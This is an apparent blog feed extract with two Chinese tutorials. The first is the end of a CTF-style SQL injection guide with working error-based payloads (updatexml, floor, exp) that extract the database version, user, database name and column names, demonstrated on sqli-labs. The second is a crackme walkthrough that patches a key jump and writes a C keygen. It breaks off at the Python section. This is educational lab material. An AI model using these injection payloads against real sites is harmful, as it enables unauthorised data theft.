class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml"></a>1.updatexml</h3><blockquote><p>updatexml 的报错原理从本质上来说就是函数的报错</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT updatexml(1,concat(0x01,(SELECT version()),0x01),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.44-0ubuntu0.14.04.1~&#39;</span><br></pre></td></tr></table></figure><p>这里还是使用前面的例子，举出一个爆破数据库版本的样例Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1+updatexml(1,concat(0x01,SELECT version(),0x01),1)%23</span><br></pre></td></tr></table></figure><p>其他功能的Payload可以参照下面floor的使用方法来修改</p><h3 id="2-floor"><a href="#2-floor" class="headerlink" title="2.floor"></a>2.floor</h3><blockquote><p>floor报错的原理是rand和order by 或 group by的冲突。在MySQL文档中的原文如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed</span><br><span class="line">Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result. </span><br></pre></td></tr></table></figure><p>了解原理之后，我们来说一下应用的方法，如下。</p><p>爆破数据库版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1‘+and(select 1 from(select count(*),concat(select (select (select concat(0x01,user(),0x01)) from information_schema.table limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>爆破当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>爆破当前使用的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>爆破指定表的字段（下面以表名为emails举例说明）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_name &#x3D; 0x656d61696c73 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>ps:我们这里采用的是十六进制的编码后的表名。如果想采用十六进制编码的表名则需要添加引号，但是这里有时候会出现单引号导致的报错</p><p>以上的Payload 可以在sqli-labs的level1中复现</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226013914953.png" alt="image-20201226013914953"></p><p>这里只演示爆破当前用户</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><blockquote><p>exp函数报错，exq()报错的本质原因是溢出报错。我们可以在MySQL中输入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from (select user())x))</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226014658415.png" alt="image-20201226014658415"></p><p>同样使用前面的例子，Payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; exp(~(select * from (select user())x))%23</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226014605414.png" alt="image-20201226014605414"></p><h2 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h2><blockquote><p>Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如返回真时返回access，为假时返回false；或者为真时返回正常页面，为假时跳转到错误页面等</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;SQL注入：开发人员在开发过程中，直接将URL中的参数、HTTP Body中的Post参数或其他外来的用户输入（如
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.ol4three.com/categories/CTF/"/>
    
    
      <category term="SQL注入" scheme="http://www.ol4three.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme2</title>
    <link href="http://www.ol4three.com/2020/12/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme2/"/>
    <id>http://www.ol4three.com/2020/12/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme2/</id>
    <published>2020-12-22T06:36:22.000Z</published>
    <updated>2020-12-23T08:45:21.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先打开进行查看"><a href="#首先打开进行查看" class="headerlink" title="首先打开进行查看"></a>首先打开进行查看</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32415.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32418.png" alt></p><p>拖入od 中进行查看 定位关键语句 发现关键跳 跟踪将</p><p>走到je的时候发现跳转已实现 那么我们可以先双击寄存器窗口的Z右边的1 改为0 此时会变成跳转未实现 线条也由红变白由此可知je 为关键跳进行 nop 操作即可成功暴破</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32421.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32424.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32426.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32436.png" alt></p><p>多选中几行，右键复制到可执行文件 所有修改 接着全部复制</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32443.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32445.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p><a href="https://www.52pojie.cn/thread-264394-1-1.html">https://www.52pojie.cn/thread-264394-1-1.html</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32451.png" alt></p><p><strong>由于我们在跳转附近没有发现任何类注册码的东西，所以，我们需要将这里块的内容F8跟踪一下，大概地看看那些地方可能和注册码相关。我们向上查找，在这段程序的开头(即找到最近的那个retn,下面开头一般是push ebp等)下断点：</strong></p><p><strong>00402310  &gt; \55        push ebp // 程序段头</strong></p><p>单步F8跟踪，将重要信息添加注释，特别是和Name/Serial相关的东西，分析后代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">00402403   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402409   &gt;  8B95 50FFFFFF mov edx,dword ptr ss:[ebp-0xB0]</span><br><span class="line">0040240F   .  8B45 E4       mov eax,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402412   .  50            push eax                                       ;  &#x2F;&#x2F;eax&#x3D;111222,name</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;]   ;  MSVBVM50.__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                    ;  edi&#x3D;6</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]                ;  ecx&#x3D;1111222地址</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                           ;  &#x2F;&#x2F; 乘法,edi*0x17CFB</span><br><span class="line">00402426   .  51            push ecx</span><br><span class="line">00402427   .  0F80 91020000 jo 004026BE</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]           ;  MSVBVM50.rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax</span><br><span class="line">00402436   .  03FA          add edi,edx                                    ;  &#x2F;&#x2F; edi&#x3D;edi+edx（0x31）</span><br><span class="line">00402438   .  0F80 80020000 jo 004026BE</span><br><span class="line">0040243E   .  57            push edi</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;]     ;  MSVBVM50.__vbaStrI4</span><br><span class="line">00402445   .  8BD0          mov edx,eax                                    ;  &#x2F;&#x2F; eax&#x3D;585235</span><br><span class="line">00402447   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040244A   .  FF15 70414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;]   ;  MSVBVM50.__vbaStrMove</span><br><span class="line">00402450   .  8BBD 50FFFFFF mov edi,dword ptr ss:[ebp-0xB0]</span><br><span class="line">00402456   .  50            push eax                                       ;  &#x2F;&#x2F; 585235</span><br><span class="line">00402457   .  57            push edi                                       ;  &#x2F;&#x2F; 0091B51C</span><br><span class="line">00402458   .  FF93 A4000000 call dword ptr ds:[ebx+0xA4]</span><br><span class="line">0040245E   .  85C0          test eax,eax                                   ;  &#x2F;&#x2F; &#x3D;&#x3D;0</span><br><span class="line">00402460   .  7D 12         jge short 00402474</span><br><span class="line">00402462   .  68 A4000000   push 0xA4</span><br><span class="line">00402467   .  68 5C1B4000   push 00401B5C</span><br><span class="line">0040246C   .  57            push edi</span><br><span class="line">0040246D   .  50            push eax</span><br><span class="line">0040246E   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402474   &gt;  8D45 E0       lea eax,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402477   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">0040247A   .  50            push eax</span><br><span class="line">0040247B   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">0040247E   .  51            push ecx</span><br><span class="line">0040247F   .  52            push edx</span><br><span class="line">00402480   .  6A 03         push 0x3</span><br><span class="line">00402482   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;;  MSVBVM50.__vbaFreeStrList</span><br><span class="line">00402488   .  83C4 10       add esp,0x10</span><br><span class="line">0040248B   .  8D45 D4       lea eax,dword ptr ss:[ebp-0x2C]</span><br><span class="line">0040248E   .  8D4D D8       lea ecx,dword ptr ss:[ebp-0x28]</span><br><span class="line">00402491   .  8D55 DC       lea edx,dword ptr ss:[ebp-0x24]</span><br><span class="line">00402494   .  50            push eax</span><br><span class="line">00402495   .  51            push ecx</span><br><span class="line">00402496   .  52            push edx</span><br><span class="line">00402497   .  6A 03         push 0x3</span><br><span class="line">00402499   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;;  MSVBVM50.__vbaFreeObjList</span><br><span class="line">0040249F   .  8B06          mov eax,dword ptr ds:[esi]</span><br><span class="line">004024A1   .  83C4 10       add esp,0x10</span><br><span class="line">004024A4   .  56            push esi</span><br><span class="line">004024A5   .  FF90 04030000 call dword ptr ds:[eax+0x304]</span><br><span class="line">004024AB   .  8B1D 0C414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaObjSet&gt;] ;  MSVBVM50.__vbaObjSet</span><br><span class="line">004024B1   .  50            push eax</span><br><span class="line">004024B2   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">004024B5   .  50            push eax</span><br><span class="line">004024B6   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaObjSet&gt;</span><br><span class="line">004024B8   .  8BF8          mov edi,eax</span><br><span class="line">004024BA   .  8D55 E8       lea edx,dword ptr ss:[ebp-0x18]</span><br><span class="line">004024BD   .  52            push edx</span><br><span class="line">004024BE   .  57            push edi</span><br><span class="line">004024BF   .  8B0F          mov ecx,dword ptr ds:[edi]</span><br><span class="line">004024C1   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024C7   .  85C0          test eax,eax                                   ;  eax&#x3D;0,zf&#x3D;1</span><br><span class="line">004024C9   .  7D 12         jge short 004024DD</span><br><span class="line">004024CB   .  68 A0000000   push 0xA0</span><br><span class="line">004024D0   .  68 5C1B4000   push 00401B5C</span><br><span class="line">004024D5   .  57            push edi</span><br><span class="line">004024D6   .  50            push eax</span><br><span class="line">004024D7   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">004024DD   &gt;  56            push esi</span><br><span class="line">004024DE   .  FF95 40FFFFFF call dword ptr ss:[ebp-0xC0]</span><br><span class="line">004024E4   .  50            push eax</span><br><span class="line">004024E5   .  8D45 D8       lea eax,dword ptr ss:[ebp-0x28]</span><br><span class="line">004024E8   .  50            push eax</span><br><span class="line">004024E9   .  FFD3          call ebx</span><br><span class="line">004024EB   .  8BF0          mov esi,eax</span><br><span class="line">004024ED   .  8D55 E4       lea edx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">004024F0   .  52            push edx</span><br><span class="line">004024F1   .  56            push esi</span><br><span class="line">004024F2   .  8B0E          mov ecx,dword ptr ds:[esi]</span><br><span class="line">004024F4   .  FF91 A0000000 call dword ptr ds:[ecx+0xA0]</span><br><span class="line">004024FA   .  85C0          test eax,eax                                   ;  eax&#x3D;0</span><br><span class="line">004024FC   .  7D 12         jge short 00402510</span><br><span class="line">004024FE   .  68 A0000000   push 0xA0</span><br><span class="line">00402503   .  68 5C1B4000   push 00401B5C</span><br><span class="line">00402508   .  56            push esi</span><br><span class="line">00402509   .  50            push eax</span><br><span class="line">0040250A   .  FF15 04414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaHresultChec&gt;;  MSVBVM50.__vbaHresultCheckObj</span><br><span class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                ;  eax&#x3D;3334444</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]                ;  ecx&#x3D;585235</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax                                       ;  eax&#x3D;3334444</span><br><span class="line">0040251D   .  68 701B4000   push 00401B70                                  ;  UNICODE &quot;AKA-&quot;</span><br><span class="line">00402522   .  51            push ecx                                       ;  ecx&#x3D;585235</span><br><span class="line">00402523   .  FFD7          call edi                                       ;  &lt;&amp;MSVBVM50.__vbaStrCat&gt;</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax                                    ;  edx&#x3D;eax&#x3D;AKA-585235</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;]    ;  MSVBVM50.__vbaStrCmp</span><br><span class="line">00402539   .  8BF0          mov esi,eax                                    ;  eax&#x3D;-1</span><br><span class="line">0040253B   .  8D55 E0       lea edx,dword ptr ss:[ebp-0x20]</span><br><span class="line">0040253E   .  F7DE          neg esi                                        ;  取补</span><br><span class="line">00402540   .  8D45 E8       lea eax,dword ptr ss:[ebp-0x18]</span><br><span class="line">00402543   .  52            push edx</span><br><span class="line">00402544   .  1BF6          sbb esi,esi</span><br><span class="line">00402546   .  8D4D E4       lea ecx,dword ptr ss:[ebp-0x1C]</span><br><span class="line">00402549   .  50            push eax</span><br><span class="line">0040254A   .  46            inc esi</span><br><span class="line">0040254B   .  51            push ecx</span><br><span class="line">0040254C   .  6A 03         push 0x3</span><br><span class="line">0040254E   .  F7DE          neg esi</span><br><span class="line">00402550   .  FF15 5C414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeStrList&gt;;  MSVBVM50.__vbaFreeStrList</span><br><span class="line">00402556   .  83C4 10       add esp,0x10</span><br><span class="line">00402559   .  8D55 D8       lea edx,dword ptr ss:[ebp-0x28]</span><br><span class="line">0040255C   .  8D45 DC       lea eax,dword ptr ss:[ebp-0x24]</span><br><span class="line">0040255F   .  52            push edx</span><br><span class="line">00402560   .  50            push eax</span><br><span class="line">00402561   .  6A 02         push 0x2</span><br><span class="line">00402563   .  FF15 F4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaFreeObjList&gt;;  MSVBVM50.__vbaFreeObjList</span><br><span class="line">00402569   .  83C4 0C       add esp,0xC</span><br><span class="line">0040256C   .  B9 04000280   mov ecx,0x80020004</span><br><span class="line">00402571   .  B8 0A000000   mov eax,0xA</span><br><span class="line">00402576   .  894D 9C       mov dword ptr ss:[ebp-0x64],ecx</span><br><span class="line">00402579   .  66:85F6       test si,si                                     ;  esi&#x3D;0,ZF&#x3D;1</span><br><span class="line">0040257C   .  8945 94       mov dword ptr ss:[ebp-0x6C],eax</span><br><span class="line">0040257F   .  894D AC       mov dword ptr ss:[ebp-0x54],ecx</span><br><span class="line">00402582   .  8945 A4       mov dword ptr ss:[ebp-0x5C],eax</span><br><span class="line">00402585   .  894D BC       mov dword ptr ss:[ebp-0x44],ecx</span><br><span class="line">00402588   .  8945 B4       mov dword ptr ss:[ebp-0x4C],eax</span><br><span class="line">0040258B      74 58         je short 004025E5                              ;  &#x2F;&#x2F; 爆破关键跳，NOP</span><br><span class="line">0040258D   .  68 801B4000   push 00401B80                                  ;  UNICODE &quot;You Get It&quot;</span><br><span class="line">00402592   .  68 9C1B4000   push 00401B9C                                  ;  ASCII &quot;\r&quot;</span><br><span class="line">00402597   .  FFD7          call edi</span><br></pre></td></tr></table></figure><p>其实代码很简单，经过一遍跟踪，基本都出来了，重点分析部分如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00402412   .  50            push eax                                       ;  &#x2F;&#x2F;eax&#x3D;111222,name</span><br><span class="line">00402413   .  8B1A          mov ebx,dword ptr ds:[edx]</span><br><span class="line">00402415   .  FF15 E4404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;]   ;  MSVBVM50.__vbaLenBstr</span><br><span class="line">0040241B   .  8BF8          mov edi,eax                                    ;  edi&#x3D;6</span><br><span class="line">0040241D   .  8B4D E8       mov ecx,dword ptr ss:[ebp-0x18]                ;  ecx&#x3D;1111222地址</span><br><span class="line">00402420   .  69FF FB7C0100 imul edi,edi,0x17CFB                           ;  &#x2F;&#x2F; 乘法,edi*0x17CFB</span><br><span class="line">00402426   .  51            push ecx</span><br><span class="line">00402427   .  0F80 91020000 jo 004026BE</span><br><span class="line">0040242D   .  FF15 F8404000 call dword ptr ds:[&lt;&amp;MSVBVM50.#516&gt;]           ;  MSVBVM50.rtcAnsiValueBstr</span><br><span class="line">00402433   .  0FBFD0        movsx edx,ax</span><br><span class="line">00402436   .  03FA          add edi,edx                                    ;  &#x2F;&#x2F; edi&#x3D;edi+edx（0x31）</span><br><span class="line">00402438   .  0F80 80020000 jo 004026BE</span><br><span class="line">0040243E   .  57            push edi</span><br><span class="line">0040243F   .  FF15 E0404000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;]     ;  MSVBVM50.__vbaStrI4</span><br><span class="line">00402445   .  8BD0          mov edx,eax                                    ;  &#x2F;&#x2F; eax&#x3D;585235</span><br></pre></td></tr></table></figure><p>首先，eax为Name的地址，经过<strong>vbaLenBstr计算的长度赋值给edi,然后edi=edi*0x17CFB,接着edi=edi+edx,而edx为Name字符串第一个字符Ansi的值，最后进过</strong>vbaStrI4将edi的整数值转换为十进制字符串585235。</p><p>然后向下跟踪和字符串585235相关的东西：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00402510   &gt;  8B45 E8       mov eax,dword ptr ss:[ebp-0x18]                ;  eax&#x3D;3334444</span><br><span class="line">00402513   .  8B4D E4       mov ecx,dword ptr ss:[ebp-0x1C]                ;  ecx&#x3D;585235</span><br><span class="line">00402516   .  8B3D 00414000 mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCat&gt;] ;  MSVBVM50.__vbaStrCat</span><br><span class="line">0040251C   .  50            push eax                                       ;  eax&#x3D;3334444</span><br><span class="line">0040251D   .  68 701B4000   push 00401B70                                  ;  UNICODE &quot;AKA-&quot;</span><br><span class="line">00402522   .  51            push ecx                                       ;  ecx&#x3D;585235</span><br><span class="line">00402523   .  FFD7          call edi                                       ;  &lt;&amp;MSVBVM50.__vbaStrCat&gt;</span><br><span class="line">00402525   .  8B1D 70414000 mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrMove&gt;&gt;;  MSVBVM50.__vbaStrMove</span><br><span class="line">0040252B   .  8BD0          mov edx,eax                                    ;  edx&#x3D;eax&#x3D;AKA-585235</span><br><span class="line">0040252D   .  8D4D E0       lea ecx,dword ptr ss:[ebp-0x20]</span><br><span class="line">00402530   .  FFD3          call ebx                                       ;  &lt;&amp;MSVBVM50.__vbaStrMove&gt;</span><br><span class="line">00402532   .  50            push eax</span><br><span class="line">00402533   .  FF15 28414000 call dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;]    ;  MSVBVM50.__vbaStrCmp</span><br><span class="line">00402539   .  8BF0          mov esi,eax                    </span><br></pre></td></tr></table></figure><p>这段代码中将585235通过<strong>vbaStrCat与”AKA-”连接到一起组成字符串”AKA-585235”,然后通过</strong>vbaStrCmp函数与我们的Serial比较结果，最后返回值放到eax中，通过返回值确定是否正确。将这里的分析与上一块合到一起，很容易就可以得出最终的注册码。</p><blockquote><p>小结一下：先取出注册码的长度len, 然后取出注册码第一个字符的ANSI值cName, 让后计算len*0x17CFB+cName,将计算的值转换为10进制文本，前面加上”AKA-”组成最后的注册码。</p></blockquote><p>C/CPP代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CrackMe160.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">// 002</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;iostream&quot;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;160CrackMe-002 Name/Serial\r\n\r\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">    gets_s(buff,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">int</span> nLen = <span class="built_in">strlen</span>(buff);</span><br><span class="line">    <span class="keyword">if</span> ( nLen &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> nRet = nLen * <span class="number">0x17CFB</span>;</span><br><span class="line">        nRet += buff[<span class="number">0</span>];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;AKA-%d\r\n&quot;</span>,nRet);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Input error!\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Python：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 